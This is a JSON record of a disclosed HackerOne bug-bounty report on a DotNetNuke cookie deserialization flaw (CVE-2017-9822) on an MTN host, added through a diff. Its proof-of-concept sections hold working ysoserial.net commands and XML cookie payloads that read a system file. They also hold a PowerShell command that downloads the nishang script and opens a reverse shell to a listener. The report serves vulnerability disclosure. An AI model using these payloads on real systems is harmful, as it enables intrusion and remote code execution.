@@ -1,0 +1,127 @@
+{
+  "id": 2762119,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzYyMTE5",
+  "url": "https://hackerone.com/reports/2762119",
+  "title": "CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-10-06T14:25:18.856Z",
+  "submitted_at": "2024-10-06T14:25:19.102Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "odaysec",
+    "url": "/odaysec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cqjxx3wbhejfzvl1dwusepkdthvr/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-9822"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-11-16T19:38:39.134Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-10-17T19:38:27.301Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nDotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected to deserialization vulnerability that leads to Remote Code Execution (RCE). DotNetNuke uses the `DNNPersonalization` cookie to store anonymous users’ personalization options (the options for authenticated users are stored through their profile pages). This cookie is used when the application serves a custom 404 Error page, which is also the default settings. \n\n```cs\npublic static Hashtable DeSerializeHashtable(string xmlSource, string rootname)\n{\n\tvar HashTable = new Hashtable();\n\n\tif (!String.IsNullOrEmpyt(xmlSource))\n\t{\n\t\ttry\n\t\t{\n\t\t\tvar xmlDoc = new XmlDocument();\n\t\t\txmlDoc.LoadXml(xmlSource);\n\n\t\t\tforeach (XmlElement xmlItem in xmlDoc.SelectNodes(rootname + \"/item\"))\n\t\t\t{\n\t\t\t\tstring key = xmlItem.GetAttribute(\"key\");\n\t\t\t\tstring typeName = xmlItem.GetAttribute(\"type\");\n\t\t\t\t\n\t\t\t\t// Create the XmlSerializer\n\t\t\t\tvar xser = new XmlSerializer(Type.GetType(typeName));\n\n\t\t\t\tvar readder = new XmlTextReadder(new StringReader(xmlItem.InnerXml));\n\n\t\t\t\t// Use the Deserialize method to restore the object's state, and store it\n\t\t\t\t// in the Hashtable\n\t\t\t\thashTable.Add(key, xser.Deserialize(reader));\n\t\t\t}\n\t\t}\n\t\tcatch(Exception)\n\t\t{\n\t\t\t// Logger.Error(ex); /*Ignore Log because if failed on profile this will log on every request.*/\n\t\t}\n\t}\n\n\treturn hashTable;\n}\n```\nThe expected structure includes a `type` attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data, which occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration). An attacker can leverage this vulnerability to execute arbitrary code on the system.\n\n\n\n\n\n\n## Proof of Concept (PoC) :\nIn order to generate payload (to check vuln.), use [YSoSerial.net](https://github.com/pwntester/ysoserial.net) with DotNetNuke plugin\n```\nPS C:\\ysoserial.net\\ysoserial\\bin\\Debug> .\\ysoserial.exe -p DotNetNuke --help\nysoserial.net generates deserialization payloads for a variety of .NET formatters.\n\nPlugin:\n\nDotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)\n\nOptions:\n\n  -m, --mode=VALUE           the payload mode: read_file, write_file,\n                               run_command.\n  -c, --command=VALUE        the command to be executed in run_command mode.\n  -u, --url=VALUE            the url to fetch the file from in write_file\n                               mode.\n  -f, --file=VALUE           the file to read in read_file mode or the file\n                               to write to in write_file_mode.\n      --minify               Whether to minify the payloads where applicable\n                               (experimental). Default: false\n      --ust, --usesimpletype This is to remove additional info only when\n                               minifying and FormatterAssemblyStyle=Simple.\n                               Default: true\n```\n```\nPS C:\\>ysoserial.net\\ysoserial\\bin\\Release\\ysoserial.exe -p DotNetNuke -m read_file -f C:\\Windows\\win.ini\n```\nor simply, use the following payload\n```xml\n<profile>\n    <item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\n        <ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n            <ExpandedElement />\n            <ProjectedProperty0>\n                <MethodName>WriteFile</MethodName>\n                <MethodParameters>\n                    <anyType xsi:type=\"xsd:string\">C:\\Windows\\win.ini</anyType>\n                </MethodParameters>\n                <ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance>\n            </ProjectedProperty0>\n        </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>\n    </item>\n</profile>\n```\nIf everything goes well, following request will return content of win.ini file in response body.\n```\nGET /__ HTTP/1.1\nHost: lonidoor.mtn.ci\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nCookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">C:\\Windows\\win.ini</anyType></MethodParameters><ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>\n```\n```\nHTTP/1.1 200 OK\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nServer: Microsoft-IIS/10.0\nSet-Cookie: .ASPXANONYMOUS=...; expires=Wed, 28-Oct-2024 03:54:58 GMT; path=/; HttpOnly\nX-AspNet-Version: 4.0.30319\nX-Powered-By: ASP.NET\nDate: Wed, 19 Aug 2020 17:14:58 GMT\nConnection: close\nContent-Length: 109\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n```\n\n## Proof of Concept (PoC) 2: Aggressive Mode (exploit with powershell reverse tcp shell)\nOn local machine, listen any port that you don't use\n```\n$ nc -nlvp 7575\n```\nGenerate payload using YSoSerial.net with DotNetNuke plugin\n```\nPS C:\\ysoserial.net\\ysoserial\\bin\\Debug> .\\ysoserial.exe -p DotNetNuke -m run_command -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575\"\n```\nPayload\n```\n<profile>\n    <item key=\"key\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\n        <ExpandedWrapperOfObjectStateFormatterObjectDataProvider>\n            <ProjectedProperty0>\n                <ObjectInstance p3:type=\"ObjectStateFormatter\" xmlns:p3=\"http://www.w3.org/2001/XMLSchema-instance\" />\n                <MethodName>Deserialize</MethodName>\n                <MethodParameters>\n                    <anyType xmlns:q1=\"http://www.w3.org/2001/XMLSchema\" p5:type=\"q1:string\" xmlns:p5=\"http://www.w3.org/2001/XMLSchema-instance\">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType>\n                </MethodParameters>\n            </ProjectedProperty0>\n        </ExpandedWrapperOfObjectStateFormatterObjectDataProvider>\n    </item>\n</profile>\n```\n```\nGET /__ HTTP/1.1\nHost: lonidoor.mtn.ci\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nCookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key=\"key\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type=\"ObjectStateFormatter\" xmlns:p3=\"http://www.w3.org/2001/XMLSchema-instance\" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1=\"http://www.w3.org/2001/XMLSchema\" p5:type=\"q1:string\" xmlns:p5=\"http://www.w3.org/2001/XMLSchema-instance\">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>\n```\n\n\n## Supporting Material/References:\nhttps://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/\nhttps://www.exploit-db.com/exploits/48336\n\n## Impact\n\nDotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-11-16T19:38:27.855Z",
+  "allow_singular_disclosure_after": -46553056.02164406,
+  "singular_disclosure_allowed": true,
+  "vote_count": 45,
+  "voters": [
+    "1mn0body",
+    "ryuku",
+    "k0ns0l",
+    "haxor31337",
+    "thalaivar304",
+    "jmo740",
+    "aliyueka",
+    "jackiehavoltrey",
+    "blackhacker8796",
+    "psicopato",
+    "and 35 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 34313,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.ci",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
